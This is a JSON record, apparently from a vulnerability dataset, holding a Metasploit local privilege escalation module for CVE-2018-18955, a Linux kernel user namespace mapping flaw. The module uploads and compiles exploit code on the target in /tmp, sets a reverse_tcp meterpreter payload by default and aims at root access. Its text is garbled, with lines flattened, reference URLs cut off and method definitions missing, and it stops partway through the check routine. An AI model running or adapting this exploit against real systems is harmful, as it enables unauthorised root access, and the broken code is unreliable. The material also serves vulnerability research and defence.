{
    "text": "vul_name : Linux Nested User Namespace idmap Limit Local Privilege Escalation ， vul_cve : CVE-2018-18955 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GreatRanking ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Linux Nested User Namespace idmap Limit Local Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18 ,  ， and 4.19.0 to 4.19.1 , where broken uid/gid mappings between nested user ， namespaces and kernel uid/gid mappings allow elevation to root ，  ( CVE-2018-18955 ) . ， The target system must have unprivileged user namespaces enabled and ， the newuidmap and newgidmap helpers installed ( from uidmap package ) . ， This module has been tested successfully on :  ， Fedora Workstation 28 kernel 4.16.3-301.fc28.x86_64 ;  ， Kubuntu 18.04 LTS kernel 4.15.0-20-generic ( x86_64 )  ;  ， Linux Mint 19 kernel 4.15.0-20-generic ( x86_64 )  ;  ， Ubuntu Linux 18.04.1 LTS kernel 4.15.0-20-generic ( x86_64 ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Jann Horn' ,  # Discovery and exploit ， 'bcoles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => 'Nov 15 2018' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， ' ，  [  ，  [ 'BID' , '105941' ]  ,  ，  [ 'CVE' , '2018-18955' ]  ,  ，  [ 'EDB' , '45886' ]  ,  ，  [ 'PACKETSTORM' , '150381' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => ， { ， 'AppendExit' => true ,  ， 'PrependSetresuid' => true ,  ， 'PrependSetreuid' => true ,  ， 'PrependSetuid' => true ,  ， 'PrependFork' => true ,  ， 'WfsDelay' => 60 ,  ， 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' ， } ,  ， 'Notes' => ， { ， 'AKA' => [ 'subuid_shell.c' ]  ， } ， register_options [  ， OptEnum.new ( 'COMPILE' ,  [ true , 'Compile on target' , 'Auto' , %w [ Auto True False ]  )  ，  ]  ， register_advanced_options [  ， OptBool.new ( 'ForceExploit' ,  [ false , 'Override check result' , false ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， rm_f path ， write_file path , data ， register_file_for_cleanup path ， end ， upload path , data ， chmod path ， end ， upload \" # {path}.c\" , data ， gcc_cmd = \"gcc -o # {path} # {path}.c\" ， gcc_cmd = \"PATH= $ PATH : /usr/bin/ # {gcc_cmd}\" ， end ， output = cmd_exec gcc_cmd ， unless output.blank? ， print_error output ， fail_with Failure : Unknown , \" # {path}.c failed to compile. Set COMPILE False to upload a pre-compiled executable.\" ， end ， register_file_for_cleanup path ， chmod path , 0755 ， end ，  : File.binread : File.join ( Msf : Config.data_directory , 'exploits' , 'cve-2018-18955' , file )  ， end ， def live_compile? ， vprint_good 'gcc is installed' ， end ， unless datastore [ 'COMPILE' ] .eql? 'Auto' ， fail_with Failure : BadConfig , 'gcc is not installed. Compiling will fail.' ， end ， end ， def check ， unless userns_enabled? ， vprint_error 'Unprivileged user namespaces are not permitted'",
    "time": "2018.11.29"
}